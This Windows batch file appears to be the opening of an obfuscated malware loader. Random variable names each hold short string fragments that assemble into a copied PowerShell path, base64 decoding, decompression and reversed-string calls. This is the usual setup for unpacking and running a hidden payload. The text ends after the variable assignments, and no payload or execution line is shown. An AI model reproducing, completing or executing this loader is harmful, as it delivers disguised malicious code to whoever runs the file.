@echo off
set "yUXvjHgVll=he"
set "qwvJobPjqZ=do"
set "fdeBDroLUX=ll"
set "wlFNWBIsOr=co"
set "PEtuhDBQmj=ws"
set "IYFEJDvAon=y "
set "vdHDODEEIg=nd"
set "ntEguWFlkn=\v"
set "sQxgZMqKoh=Sy"
set "IjHNokJVqv=s\"
set "JdweWrmOjO=st"
set "PCmRhtBsuD=rS"
set "ZVzxhWyDpo=.e"
set "NZOuBWvfHR=ow"
set "qaiLKJxXlx=Wi"
set "GZsejJtqdA=ll"
set "yKPinxtdcp=he"
set "wypHzkphlg=we"
set "ospuOmvToE=em"
set "PwEfRWjxFl=xe"
set "UIiteqnTxE=py"
set "zSdsGYWMfO=Po"
set "ePxwpefJOq=po"
set "lSHbfPNJDu= C"
set "uQrajJPnJx= /"
set "GLQzhEMDQW=\W"
set "IirTgboIeI=rs"
set "RhSOSBLClQ=we"
set "XVMBhZAcsN=in"
set "QmeVbLyLoP=0\"
set "xErBpMIgub=1."
set "TIomOXBHuP=32"
set "PXndLnIelK=:\"
set "jwUTDdCWqE= %~dp0"
set "MsPpYkTniD=cd"
set "EWNndZtYbE=Disp"
set "NiENpgwkyq=ard "
set "WcWiUAOMOe=tryP"
set "YkZaQkDxgI=bstr"
set "DaZgZiBouN=gnir"
set "HIZBiLOLul=);$J"
set "ZLNcKFPVqs=D = "
set "NppAkBFXej=New-"
set "ftuTGgcpuf=sion"
set "tUcLPuYXlY=tem."
set "UXNYlKnJOu=.Dis"
set "dwMJxEOkkZ=vj0m"
set "dKPSXnRlcA=D = "
set "LusKCGcURg=rtS4"
set "GQePzYFRIP=1..-"
set "bSKpCxMLVb=('%*'"
set "NaLGdANBqI=O.En"
set "CugSzuIZPi=th('"
set "xWXMIxaHDJ=Obje"
set "BMpRjwdQUR=esMa"
set "BYXVRcLUpv=ateD"
set "WRYxNEJDlO=oryS"
set "sFWNOqtDmX=);$z"
set "OATiWUtMDx=-1.."
set "ZUXiBOcZIC=rofi"
set "OmTyapSTHg=le  "
set "xUoBncmjUm=Comp"
set "UpPLdasbiL=.IO."
set "rnuyZEjXou=F = "
set "TkPquPQzhU=, (,"
set "zBAtpnQROL=;$ve"
set "fDivapNccz=t Sy"
set "fOymitHgql=ode]"
set "FqWufisrMl=($Xd"
set "sTnoUpuait=QKGy"
set "GYWmXLWhVp=('da"
set "ZJpNYivkJz=yTo("
set "FDmfqqUYDw=d;$E"
set "gcuhEuLKEz=onve"
set "RrLUxjvxbB=[Sys"
set "AYibZjFcNu=).Sp"
